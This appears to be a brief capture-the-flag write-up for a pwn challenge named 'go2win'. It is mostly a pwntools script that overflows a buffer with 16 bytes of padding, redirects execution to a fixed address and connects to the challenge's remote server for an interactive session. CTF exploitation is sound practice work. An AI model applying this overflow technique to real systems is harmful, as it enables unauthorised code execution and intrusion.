# HACKAPPATOI-CTF

## Pwn and Rev
===============

## PwN 1 
The first chall a buffer overflow, attachments are one binary file. `go2win`
```
import shutup; shutup.please()
from pwn import *

elf = context.binary = ELF('./go2win')
io = elf.process()

io = remote('92.246.89.201', 10003)

offset = 16

payload = b''
payload += b'A' * offset 
payload += p64(0x47f7a0)

io.sendline(payload)
io.interactive()
```



